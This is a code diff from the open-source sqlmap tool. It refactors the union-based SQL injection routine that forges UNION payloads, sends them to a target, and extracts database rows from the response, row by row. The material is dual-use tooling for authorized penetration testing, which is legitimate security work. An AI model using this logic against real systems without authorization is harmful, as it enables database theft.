@@ -32,6 +32,41 @@ from lib.utils.resume import resume
 
 reqCount = 0
 
+def __oneShotUnionUse(expression, unpack=True, unescape=True):
+    global reqCount
+
+    # Prepare expression with delimiters
+    if unescape:
+        expression = agent.concatQuery(expression, unpack)
+        expression = unescaper.unescape(expression)
+
+    if conf.limitStart or conf.limitStop:
+        where = 2
+    else:
+        where = None
+
+    # Forge the inband SQL injection request
+    vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector
+    query = agent.forgeInbandQuery(expression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5])
+    payload = agent.payload(newValue=query, where=where)
+
+    # Perform the request
+    page, headers = Request.queryPage(payload, content=True, raise404=False)
+    content = "%s%s" % (page or "", listToStrValue(headers.headers if headers else None) or "")
+
+    reqCount += 1
+
+    if kb.misc.start not in content or kb.misc.stop not in content:
+        return None
+
+    # Parse the returned page to get the exact inband
+    # sql injection output
+    startPosition = content.index(kb.misc.start)
+    endPosition = content.rindex(kb.misc.stop) + len(kb.misc.stop)
+    value = getUnicode(content[startPosition:endPosition])
+
+    return value
+
 def configUnion(char=None, columns=None):
     def __configUnionChar(char):
         if char.isdigit() or char == "NULL":
@@ -67,7 +102,7 @@ def configUnion(char=None, columns=None):
     elif isinstance(columns, basestring):
         __configUnionCols(columns)
 
-def unionUse(expression, direct=False, unescape=True, resetCounter=False, unpack=True, dump=False):
+def unionUse(expression, direct=False, unescape=True, unpack=True, dump=False):
     """
     This function tests for an inband SQL injection on the target
     url then call its subsidiary function to effectively perform an
@@ -76,38 +111,47 @@ def unionUse(expression, direct=False, unescape=True, resetCounter=False, unpack
 
     initTechnique(PAYLOAD.TECHNIQUE.UNION)
 
+    global reqCount
+
     count = None
     origExpr = expression
-    start = time.time()
     startLimit = 0
     stopLimit = None
     test = True
     value = ""
+    reqCount = 0
+    start = time.time()
 
-    global reqCount
+    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)
 
-    if resetCounter:
-        reqCount = 0
+    # We have to check if the SQL query might return multiple entries
+    # and in such case forge the SQL limiting the query output one
+    # entry per time
+    # NOTE: I assume that only queries that get data from a table can
+    # return multiple entries
+    if (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == 2 or \
+       (dump and (conf.limitStart or conf.limitStop))) and \
+       " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() \
+       not in FROM_TABLE) or (Backend.getIdentifiedDbms() in FROM_TABLE \
+       and not expression.upper().endswith(FROM_TABLE[Backend.getIdentifiedDbms()]))) \
+       and "EXISTS(" not in expression.upper() and "(CASE" not in expression.upper():
 
-    # Prepare expression with delimiters
-    if unescape:
-        expression = agent.concatQuery(expression, unpack)
-        expression = unescaper.unescape(expression)
+        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
+        topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)
 
-    if kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == 2 and not direct:
-        _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)
+        if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
+            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
+                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
+                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query
 
-        # We have to check if the SQL query might return multiple entries
-        # and in such case forge the SQL limiting the query output one
-        # entry per time
-        # NOTE: I assume that only queries that get data from a table can
-        # return multiple entries
-        if " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_TABLE) or (Backend.getIdentifiedDbms() in FROM_TABLE and not expression.upper().endswith(FROM_TABLE[Backend.getIdentifiedDbms()]))) and "EXISTS(" not in expression.upper():
-            limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
-            topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)
+                if limitGroupStart.isdigit():
+                    startLimit = int(limitRegExp.group(int(limitGroupStart)))
 
-            if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
-                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
+                stopLimit = limitRegExp.group(int(limitGroupStop))
+                limitCond = int(stopLimit) > 1
+
+            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
+                if limitRegExp:
                     limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                     limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query
 
@@ -116,155 +160,102 @@ def unionUse(expression, direct=False, unescape=True, resetCounter=False, unpack
 
                     stopLimit = limitRegExp.group(int(limitGroupStop))
                     limitCond = int(stopLimit) > 1
+                elif topLimit:
+                    startLimit = 0
+                    stopLimit = int(topLimit.group(1))
+                    limitCond = int(stopLimit) > 1
+
+            elif Backend.getIdentifiedDbms() == DBMS.ORACLE:
+                limitCond = False
+        else:
+            limitCond = True
+
+        # I assume that only queries NOT containing a "LIMIT #, 1"
+        # (or similar depending on the back-end DBMS) can return
+        # multiple entries
+        if limitCond:
+            if limitRegExp:
+                stopLimit = int(stopLimit)
+
+                # From now on we need only the expression until the " LIMIT "
+                # (or similar, depending on the back-end DBMS) word
+                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
+                    stopLimit += startLimit
+                    untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
+                    expression = expression[:untilLimitChar]
 
                 elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
-                    if limitRegExp:
-                        limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
-                        limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query
+                    stopLimit += startLimit
+            elif dump:
+                if conf.limitStart:
+                    startLimit = conf.limitStart
+                if conf.limitStop:
+                    stopLimit = conf.limitStop
 
-                        if limitGroupStart.isdigit():
-                            startLimit = int(limitRegExp.group(int(limitGroupStart)))
+            # Count the number of SQL query entries output
+            countFirstField = queries[Backend.getIdentifiedDbms()].count.query % expressionFieldsList[0]
+            countedExpression = expression.replace(expressionFields, countFirstField, 1)
 
-                        stopLimit = limitRegExp.group(int(limitGroupStop))
-                        limitCond = int(stopLimit) > 1
-                    elif topLimit:
-                        startLimit = 0
-                        stopLimit = int(topLimit.group(1))
-                        limitCond = int(stopLimit) > 1
+            if re.search(" ORDER BY ", expression, re.I):
+                untilOrderChar = countedExpression.index(" ORDER BY ")
+                countedExpression = countedExpression[:untilOrderChar]
 
-                elif Backend.getIdentifiedDbms() == DBMS.ORACLE:
-                    limitCond = False
-            else:
-                limitCond = True
+            count = resume(countedExpression, None)
+            count = parseUnionPage(count, countedExpression)
 
-            # I assume that only queries NOT containing a "LIMIT #, 1"
-            # (or similar depending on the back-end DBMS) can return
-            # multiple entries
-            if limitCond:
-                if limitRegExp:
-                    stopLimit = int(stopLimit)
+            if not count or not count.isdigit():
+                output = __oneShotUnionUse(countedExpression)
 
-                    # From now on we need only the expression until the " LIMIT "
-                    # (or similar, depending on the back-end DBMS) word
-                    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
-                        stopLimit += startLimit
-                        untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
-                        expression = expression[:untilLimitChar]
+                if output:
+                    count = parseUnionPage(output, countedExpression)
 
-                    elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
-                        stopLimit += startLimit
-                elif dump:
-                    if conf.limitStart:
-                        startLimit = conf.limitStart
-                    if conf.limitStop:
-                        stopLimit = conf.limitStop
+            if (not count or (count.isdigit() and int(count) == 0)):
+                warnMsg = "it was not possible to count the number "
+                warnMsg += "of entries for the used SQL query. "
+                warnMsg += "sqlmap will assume that it returns only "
+                warnMsg += "one entry"
+                logger.warn(warnMsg)
 
-                if not stopLimit or stopLimit <= 1:
-                    if Backend.getIdentifiedDbms() in FROM_TABLE and expression.upper().endswith(FROM_TABLE[Backend.getIdentifiedDbms()]):
-                        test = False
+                stopLimit = 1
+            elif isNumPosStrValue(count):
+                if isinstance(stopLimit, int) and stopLimit > 0:
+                    stopLimit = min(int(count), int(stopLimit))
+                else:
+                    stopLimit = int(count)
+
+                    infoMsg = "the SQL query used returns "
+                    infoMsg += "%d entries" % stopLimit
+                    logger.info(infoMsg)
+            try:
+                for num in xrange(startLimit, stopLimit):
+                    if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
+                        field = expressionFieldsList[0]
+                    elif Backend.getIdentifiedDbms() == DBMS.ORACLE:
+                        field = expressionFieldsList
                     else:
-                        test = True
+                        field = None
 
-                if test:
-                    # Count the number of SQL query entries output
-                    countFirstField = queries[Backend.getIdentifiedDbms()].count.query % expressionFieldsList[0]
-                    countedExpression = origExpr.replace(expressionFields, countFirstField, 1)
+                    limitedExpr = agent.limitQuery(num, expression, field)
+                    output = resume(limitedExpr, None)
 
-                    if re.search(" ORDER BY ", expression, re.I):
-                        untilOrderChar = countedExpression.index(" ORDER BY ")
-                        countedExpression = countedExpression[:untilOrderChar]
+                    if not output:
+                        output = __oneShotUnionUse(limitedExpr, unescape=unescape)
 
-                    count = resume(countedExpression, None)
+                    if output:
+                        value += output
+                        parseUnionPage(output, limitedExpr)
 
-                    if not stopLimit:
-                        if not count or not count.isdigit():
-                            output = unionUse(countedExpression, direct=True)
+            except KeyboardInterrupt:
+                print
+                warnMsg = "Ctrl+C detected in dumping phase"
+                logger.warn(warnMsg)
 
-                            if output:
-                                count = parseUnionPage(output, countedExpression)
+    if not value:
+        value = __oneShotUnionUse(expression, unescape=unescape)
 
-                        if isNumPosStrValue(count):
-                            stopLimit = int(count)
+    duration = calculateDeltaSeconds(start)
 
-                            infoMsg = "the SQL query used returns "
-                            infoMsg += "%d entries" % stopLimit
-                            logger.info(infoMsg)
-
-                        elif count and not count.isdigit():
-                            warnMsg = "it was not possible to count the number "
-                            warnMsg += "of entries for the used SQL query. "
-                            warnMsg += "sqlmap will assume that it returns only "
-                            warnMsg += "one entry"
-                            logger.warn(warnMsg)
-
-                            stopLimit = 1
-
-                        elif (not count or int(count) == 0):
-                            warnMsg = "the SQL query used does not "
-                            warnMsg += "return any output"
-                            logger.warn(warnMsg)
-
-                            return None
-
-                    elif (not count or int(count) == 0) and (not stopLimit or stopLimit == 0):
-                        warnMsg = "the SQL query used does not "
-                        warnMsg += "return any output"
-                        logger.warn(warnMsg)
-
-                        return None
-
-                    try:
-                        for num in xrange(startLimit, stopLimit):
-                            if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
-                                field = expressionFieldsList[0]
-                            elif Backend.getIdentifiedDbms() == DBMS.ORACLE:
-                                field = expressionFieldsList
-                            else:
-                                field = None
-
-                            limitedExpr = agent.limitQuery(num, expression, field)
-                            output = resume(limitedExpr, None)
-
-                            if not output:
-                                output = unionUse(limitedExpr, direct=True, unescape=False)
-
-                            if output:
-                                value += output
-                                parseUnionPage(output, limitedExpr)
-
-                    except KeyboardInterrupt:
-                        print
-                        warnMsg = "Ctrl+C detected in dumping phase"
-                        logger.warn(warnMsg)
-
-                    return value
-
-        value = unionUse(expression, direct=True, unescape=False)
-
-    else:
-        # Forge the inband SQL injection request
-        vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector
-        query = agent.forgeInbandQuery(expression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5])
-        payload = agent.payload(newValue=query)
-
-        # Perform the request
-        page, headers = Request.queryPage(payload, content=True, raise404=False)
-        content = "%s%s" % (page or "", listToStrValue(headers.headers if headers else None) or "")
-
-        reqCount += 1
-
-        if kb.misc.start not in content or kb.misc.stop not in content:
-            return None
-
-        # Parse the returned page to get the exact inband
-        # sql injection output
-        startPosition = content.index(kb.misc.start)
-        endPosition = content.rindex(kb.misc.stop) + len(kb.misc.stop)
-        value = getUnicode(content[startPosition:endPosition])
-
-        duration = calculateDeltaSeconds(start)
-
-        debugMsg = "performed %d queries in %d seconds" % (reqCount, duration)
-        logger.debug(debugMsg)
+    debugMsg = "performed %d queries in %d seconds" % (reqCount, duration)
+    logger.debug(debugMsg)
 
     return value
